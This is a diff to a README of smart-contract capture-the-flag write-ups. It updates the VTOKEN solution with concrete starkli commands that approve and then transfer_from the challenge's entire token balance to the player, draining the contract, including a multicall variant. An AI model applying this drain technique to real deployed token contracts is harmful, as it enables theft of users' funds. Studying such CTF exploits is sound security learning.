@@ -10,9 +10,9 @@ This repo contains my write-up for the different challenges available at https:/
 | 02               | [CALL ME](#call-me)        | &#9745; | &#9745;                      | Capture The Ether (2022) |
 | 03               | [NICKNAME](#nickname)       | &#9745; | &#9745;                      | Capture The Ether (2022) |
 | 04               | [GUESS](#guess)          | &#9745; | &#9745;                      | Capture The Ether (2022) |
-| 05               | [SECRET](#secret)         | &#9745; | &#9744;                      | Capture The Ether (2022) |
+| 05               | [SECRET](#secret)         | &#9745; | &#9745;                      | Capture The Ether (2022) |
 | 06               | [RANDOM](#random)         | &#9745; | &#9745;                      | Capture The Ether (2022) |
-| 07               | [VTOKEN](#vtoken)         | &#9745; | &#9744;                      | Secureum A-Maze X (2022) |
+| 07               | [VTOKEN](#vtoken)         | &#9745; | &#9745;                      | Secureum A-Maze X (2022) |
 | 08               | [INSECURE DEX](#insecure-dex)   | &#9745; | &#9744;                      | Secureum A-Maze X (2022) |
 | 09               | [FAL1OUT](#fal1out)        | &#9745; | &#9745;                      | Ethernaut (2022)         |
 | 10               | [COINFLIP](#coinflip)       | &#9745; | &#9745;                      | Ethernaut (2022)         |
@@ -249,23 +249,30 @@ The `approve( ref self: ContractState, owner: ContractAddress, spender: Contract
 
 Challenge address: <challenge_addr>
 
-2. Get the vtoken address (through explorer or starkli): <vtoken_addr>
+2. Get the vtoken address (through explorer or starkli):
+
+   ```bash
+    starkli call 0x1dc497b8fb03b9effe2dfc5fdb65dea153e41c558e9825c9374935f36945d48 $(starkli selector get_vtoken_address)
+   [
+    "0x053dcd9f8332da68368d3be70fa2434704dda44265631571953413f8a48620e8"
+   ]
+   ```
 
 3. Approve the spending of `u256:100000000000000000000` from `<challenge_addr>` by yourself (`0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b`, here):
 
    ```bash
-   starkli invoke <vtoken_addr> $(starkli selector approve) <challenge_addr> 0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b u256:100000000000000000000
+   starkli invoke 0x053dcd9f8332da68368d3be70fa2434704dda44265631571953413f8a48620e8 $(starkli selector approve) 0x1dc497b8fb03b9effe2dfc5fdb65dea153e41c558e9825c9374935f36945d48 0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b u256:100000000000000000000
    ```
 
 4. Drain all $VTK from the challenge with `transfer_from(ref self: ContractState, sender: ContractAddress, recipient: ContractAddress, amount: u256)`:
    ```bash
-   starkli invoke <vtoken_addr> $(starkli selector transfer_from) <challenge_addr> 0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b u256:100000000000000000000
+   starkli invoke 0x053dcd9f8332da68368d3be70fa2434704dda44265631571953413f8a48620e8 $(starkli selector transfer_from) 0x1dc497b8fb03b9effe2dfc5fdb65dea153e41c558e9825c9374935f36945d48 0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b u256:100000000000000000000 --watch
    ```
 
 It can be done with a multicall:
 
 ```bash
-   starkli invoke <vtoken_addr> $(starkli selector approve) <challenge_addr> 0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b u256:100000000000000000000 / <vtoken_addr> $(starkli selector transfer_from) <challenge_addr> 0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b u256:100000000000000000000
+starkli invoke 0x053dcd9f8332da68368d3be70fa2434704dda44265631571953413f8a48620e8 $(starkli selector approve) 0x1dc497b8fb03b9effe2dfc5fdb65dea153e41c558e9825c9374935f36945d48 0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b u256:100000000000000000000 / 0x053dcd9f8332da68368d3be70fa2434704dda44265631571953413f8a48620e8 $(starkli selector transfer_from) 0x1dc497b8fb03b9effe2dfc5fdb65dea153e41c558e9825c9374935f36945d48 0x0558d69359aC03Ca4B900bE7e686220D09e82A83010757071e62a088aE86122b u256:100000000000000000000 --watch
 ```
 
 5. Verify the solution and mint the NFT
